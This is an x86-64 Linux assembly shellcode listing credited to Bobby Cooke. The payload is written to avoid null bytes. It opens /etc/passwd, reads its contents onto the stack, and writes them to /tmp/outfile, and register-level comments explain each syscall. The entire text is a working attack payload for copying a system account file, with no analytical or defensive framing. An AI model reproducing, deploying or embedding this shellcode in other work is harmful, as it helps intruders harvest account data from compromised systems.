; Author: Bobby Cooke
; int open(const char *pathname, int flags);
; rax=0x2   rdi=&AbsFileName     rsi=0x0
; open("/etc/passwd", O_RDONLY)           = 3
; RAX: 0x2 ; RSI: 0x0 ; RDI: 0x7fffffffe368 ("/etc/passwd")
xor rdi,rdi
mul rdi
push rdi                        ; null terminator
push dword 0x64777373           ; "swd"
mov rdx,0x61702f6374652f2f ; "//etc/pa"
push rdx
mov rdi, rsp                  ; ARG1 = &etcPasswd
push rax
pop rsi                         ; ARG2 = 0_RDONLY
mov al, 0x2                     ; open syscall
syscall

; ssize_t read(int fd, void *buf, size_t count);
; rax=0x0      rdi=fd  rsi=&Dest  rdx=len(2read)
mov    rdi, rax            ; rbx = fd
xor    rcx, rcx
mul    rcx                 ; 0x0 = read systemcall
mov    rsi, rsp            ; &Dest = Top of Stack
mov    dx, 0xffff          ; Read a crap ton of bytes
syscall                    ; read systemcall

; int open(const char *pathname, int flags);
; rax=0x2   rdi=&AbsFileName     rsi=0x0
; RAX: 0x2
; RSI: 0x441 - write
; RDI: 0x7fffffffe350 ("/tmp/outfile")
mov    r8,rax
mov    rax,rsp
xor    rbx,rbx
push   rbx                    ; 0x00 Nulll Str Terminator
mov    ebx,0x656c6966         ; "file"
push   rbx
mov    rbx,0x74756f2f706d742f ; "/tmp/out"
push   rbx
mov    rbx,rax
xor    rax,rax
mov    al,0x2                 ; open systemcall
lea    rdi,[rsp]              ; rdi = &String
xor    rsi,rsi
push   0x441
pop    si
syscall

; ssize_t write(int fd, const void *buf, size_t count);
; rax= 0x1      rdi=fd  rsi=&Src        rdx=len(write)
mov    rdi,rax           ; rdi = fd /tmp/outfile
xor    rax,rax
mov    al,0x1            ; write systemcall
lea    rsi,[rbx]
xor    rdx,rdx
mov    rdx,r8
syscall

;;close(fd)
xor rax, rax             ; rdi is already the file descriptor
add al, 3                ; 0x3 = close systemcall
syscall

;;sys_exit(int err_code)
xor rax, rax
mov al, 0x3C             ; 0x3C = exit systemcall
xor rdi, rdi             ; ARG1 = Error Code = 0x0
syscall


